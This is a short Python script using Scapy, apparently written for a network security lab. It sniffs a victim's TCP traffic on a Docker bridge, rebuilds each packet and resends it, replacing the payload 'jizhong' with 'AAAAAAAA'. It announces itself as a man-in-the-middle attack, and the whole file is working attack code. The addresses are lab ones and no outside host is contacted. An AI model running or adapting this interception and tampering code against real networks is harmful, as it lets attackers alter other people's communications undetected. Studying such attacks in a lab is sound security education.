#!/usr/bin/env python3
from scapy.all import *

V_IP = '10.9.0.5'
V_MAC = '02:42:0a:09:00:05'
VM_IP = '10.0.2.4'
VM_MAC = '08:00:27:19:6d:5a'

def spoof_pkt(pkt):
  newpkt = IP(bytes(pkt[IP]))
  newpkt.ttl = 3
  del(newpkt.chksum)
  del(newpkt[TCP].payload)
  del(newpkt[TCP].chksum)

  if pkt[TCP].payload:
    data = pkt[TCP].payload.load
    print("*** %s, length: %d" % (data, len(data)))
    # pkt.show()
    newdata = data

    # Replace a pattern
    if(data == b'jizhong\n'):
      print("pattern matched.")
      newdata = b'AAAAAAAA\n'
    # newdata = data.replace(b'jizhong\n', b'AAAAAAAA\n')

    send(newpkt/newdata, verbose=0)
  else:
    send(newpkt, verbose=0)

print("LAUNCHING MITM ATTACK.........")
f0 = 'tcp or udp'
f1 = 'tcp and src host ' + V_IP
f2 = 'tcp and (ether src ' +  V_MAC + ')'
pkt = sniff(iface='br-f659e2f7cd2a', filter=f2, prn=spoof_pkt)

